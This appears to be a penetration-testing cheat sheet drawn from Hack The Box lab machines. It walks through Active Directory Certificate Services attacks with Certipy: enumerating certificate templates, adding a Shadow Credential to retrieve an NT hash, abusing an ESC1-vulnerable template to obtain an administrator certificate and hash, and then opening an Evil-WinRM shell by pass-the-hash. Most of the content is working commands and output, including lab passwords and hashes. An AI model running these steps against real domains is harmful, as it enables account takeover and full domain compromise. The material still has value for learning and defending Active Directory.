Download  [Certipy](https://github.com/ly4k/Certipy) 

```bash
pip install certipy-ad
```

## # `ADCS` -

- Check for Active Directory Certificate Services :

```bash
certipy find
```

It will return all sorts of information about the domain and how Active Directory Certificate Services (ADCS) is configured. It doesn’t check `/tmp/krb5cc` by default, so you’ll need to set that environment variable to be able to use it :

```bash
napster@kali$ KRB5CCNAME=/tmp/krb5cc_1000 certipy find -username m.lovegod@absolute.htb -k -target dc.absolute.htb 
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'absolute-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'absolute-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'absolute-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'absolute-DC-CA'
[*] Saved BloodHound data to '20230523213024_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230523213024_Certipy.txt'
[*] Saved JSON output to '20230523213024_Certipy.json'
```

The above result is a good sign that ADCS is installed.

## # `Shadow Credential` -

The “**Shadow Credentia**l” technique involves manipulating the user’s `msDS-KeyCredentialLink` attribute, which binds a credential to their account that you can then use to authenticate. This technique is much less disruptive than just changing the user’s password. [This post from Spector Ops](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) has a ton of good detail.

This technique requires the following:

- At least one Windows Server 2016 Domain Controller.
- A digital certificate for Server Authentication installed on the Domain Controller.
- Windows Server 2016 Functional Level in Active Directory.
- ==Compromise an account with the delegated rights to write to the msDS-KeyCredentialLink== attribute of the target object.

Adding Shadow Credential :

`certipy shadow auto` will add the shadow credential to the winrm_user user :

```bash
napster@hacky$ KRB5CCNAME=/tmp/krb5cc_1000 certipy shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb 
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2608415b-4088-a5fd-bc55-20c685887995'
[*] Adding Key Credential with device ID '2608415b-4088-a5fd-bc55-20c685887995' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID '2608415b-4088-a5fd-bc55-20c685887995' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Using principal: winrm_user@absolute.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_user.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
```

The above has created a credential and given both a NT hash and saved a ticket in `winrm_user.ccache` .

[m.lovegod had Generic Write on winrm_user which allowed us to write to the msDS-KeyCredentialLink attribute of the winrm_user and get shadow Credential]

## # `Identify Vulnerable Template` -

It has a `find` command that will identify the vulnerable template :

```bash
napster@hacky$ certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
...[snip]...
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms 
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

The danger here is that `sequel\Domain Users` has Enrollment Rights for the certificate.

And `req` allows you to get the `.pfx` certificate :

```bash
oxdf@hacky$ certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

The `auth` command will take that certificate (`administrator.pfx`) and get the hash :

```bash
oxdf@hacky$ certipy auth -pfx administrator.pfx 
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

With the NTLM hash for administrator, You can connect over Evil-WinRM :

```bash
napster@hacky$ evil-winrm -i 10.10.11.202 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

